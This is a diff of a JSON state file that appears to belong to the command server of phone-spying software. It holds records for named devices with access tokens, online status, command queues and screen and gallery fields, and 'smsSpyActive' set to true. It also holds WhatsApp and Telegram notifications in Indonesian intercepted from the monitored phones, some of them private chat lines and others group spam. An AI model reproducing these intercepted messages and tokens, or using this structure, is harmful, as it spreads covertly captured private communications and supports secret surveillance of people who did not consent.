@@ -6331,6 +6331,22 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎3510 pesan dari 23 chat",
+        "time": "21/04 19:13",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776773610723
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎7Sex Message (184 pesan): ~ hyurά",
+        "content": "🔗 Arisu Soft Cloud | ⚠️ BACA SAMPAI HABIS! ⚠️\n\nMenjadi bot bisa membuat nomor kamu dibanned WhatsApp. Gunakan dengan bijak dan `tanggung sendiri risikonya`.\n\nCARA MENJADI BOT WHATSAPP\n- Buka link ini: https://jadibot.arisusoft.com\n- login dengan akun google (klik logo google dibawah)\n- Setelah login, masukkan nomor WhatsApp dan ikuti petunjuk yang tertera.\n\nCARA MEMATIKAN JADIBOT WHATSAPP\n- Buka WhatsApp di telepon Anda\n- Klik Titik Tiga di Kanan Atas WhatsApp Android, atau Pengaturan di iPhone\n- Klik Perangkat tertaut lalu Pilih Perangkat Tertaut Bot Kamu\n- Klik Hapus Perangkat Tertaut.\n\nTUTORIAL\nhttps://youtube.com/shorts/Sp9SfbbsyYo\n\nCARA MENGURANGI RESIKO BANNED:\n- Pastikan nomor mu telah terdaftar dan aktif di Whatsapp lebih dari 2 minggu.\n- Jangan spam dan jangan join terlalu banyak bergabung ke dalam grup.\n- Jangan gunakan nomor utama karena resiko banned akan selalu ada dan tinggi.",
+        "time": "21/04 19:13",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776773610687
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "‎7Sex Message (183 pesan): ~ hyurά",
         "content": "Hei karbit, teruslah menjadi karbit. Temukan gambar istri barumu di saluran kami:\nhttps://whatsapp.com/channel/0029Vay0gom9cDDSRxFMgh2b\n\n- Ingin menghilangkan iklan seperti ini? upgrade grup kamu ke VIP/VVIP dengan command !VIP",
         "time": "21/04 19:13",
@@ -10312,22 +10328,6 @@
         "time": "21/04 18:16",
         "pkg": "com.whatsapp",
         "receivedAt": 1776770217710
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎JB || RULZ STORE KALBAR (616 pesan): ~ ada",
-        "content": "📷 300+\n\n* max 1 evo 2\n* log ggl bind sepaket\n* sg lobby 2\n* v140 \n\n(MC YANG AKU KENAL/COD SIANTAN)",
-        "time": "21/04 18:16",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776770217693
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎All Buyer Pegasus-X ( No Update ) (40 pesan): ~ Ajm",
-        "content": "@⁨Owner Pega⁩ bang balas caht aku",
-        "time": "21/04 18:16",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776770200402
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776773607142,
+    "lastSeen": 1776773610722,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10387,7 +10387,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "e308898150127caeca3b2487066a87c8",
-    "lastSeen": 1776773606201,
+    "lastSeen": 1776773609181,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:19:21.483Z",
@@ -10403,6 +10403,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Nanat",
+        "content": "Telepon video berlangsung",
+        "time": "21/04 19:13",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776773608594
+      },
       {
         "appName": "WhatsApp",
         "sender": "Nanat",
@@ -14394,14 +14402,6 @@
         "time": "21/04 18:16",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776770211353
-      },
-      {
-        "appName": "Telegram",
-        "sender": "./j4X¡tsme な #sa #flory 🎖️",
-        "content": "Noktel id 1 gw sisa 2 biji di g.a in gas ga ges??",
-        "time": "21/04 18:16",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776770208641
       }
     ],
     "galleryPhotos": [],
